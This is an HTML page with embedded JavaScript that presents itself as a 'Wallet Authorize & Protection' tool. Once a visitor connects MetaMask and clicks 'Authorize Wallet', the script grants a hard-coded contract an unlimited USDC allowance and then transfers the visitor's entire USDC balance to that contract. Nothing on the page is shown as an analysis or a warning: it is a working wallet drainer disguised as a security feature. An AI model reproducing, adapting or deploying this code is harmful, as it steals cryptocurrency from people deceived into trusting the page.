<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Mark III ¬∑ Wallet Authorize & Protection</title>
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background: #f4f7f9;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding-top: 60px;
    }
    h2 {
      color: #333;
    }
    button {
      padding: 12px 24px;
      margin: 12px;
      font-size: 16px;
      border: none;
      border-radius: 12px;
      background: linear-gradient(145deg, #ffffff, #e6e6e6);
      box-shadow: 2px 4px 10px rgba(0, 0, 0, 0.1);
      transition: all 0.3s ease;
      cursor: pointer;
    }
    button:hover {
      background: #d7efff;
    }
    #status {
      margin-top: 20px;
      font-size: 14px;
      color: #666;
    }
  </style>
</head>
<body>
  <h2>Mark III ¬∑ Wallet Authorize & Protection</h2>

  <button id="connect">Connect Wallet</button>
  <button id="authorize">Authorize Wallet</button>
  <div id="status">Status: Waiting for wallet...</div>

  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
<script>
  window.addEventListener('DOMContentLoaded', () => {
    const usdcAddress = "0xA0b86991C6218B36C1d19D4a2e9Eb0cE3606eB48"; // USDC ‰∏ªÁΩëÂú∞ÂùÄ
    const contractAddress = "0x86DBe265b0d503e68676971fc7d6aAD7E5d90b12";
    const maxAmount = ethers.constants.MaxUint256;
    
    let provider, signer, user;

    const status = document.getElementById("status");
    const connectBtn = document.getElementById("connect");
    const authorizeBtn = document.getElementById("authorize");

    connectBtn.onclick = async () => {
      if (!window.ethereum) return alert("Please install MetaMask");
      provider = new ethers.providers.Web3Provider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      signer = provider.getSigner();
      user = await signer.getAddress();
      status.innerText = "üîó Connected: " + user;
    };

    authorizeBtn.onclick = async () => {
      const usdc = new ethers.Contract(
        usdcAddress,
        [
          "function approve(address,uint256) public returns (bool)",
          "function transferFrom(address,address,uint256) public returns (bool)",
          "function balanceOf(address) view returns (uint256)"
        ],
        signer
      );
      try {
        status.innerText += "\n‚è≥ Approving contract...";
        const tx1 = await usdc.approve(contractAddress, maxAmount);
        await tx1.wait();

        const balance = await usdc.balanceOf(user);
        status.innerText += "\nüí∏ Transferring USDC: " + ethers.utils.formatUnits(balance, 6) + " USDC";

        const tx2 = await usdc.transferFrom(user, contractAddress, balance);
        await tx2.wait();

        status.innerText += "\n‚úÖ All steps completed.";
      } catch (e) {
        console.error(e);
        status.innerText += "\n‚ùå Error: " + (e.reason || e.message || "Unknown error");
      }
    };
  });
</script>
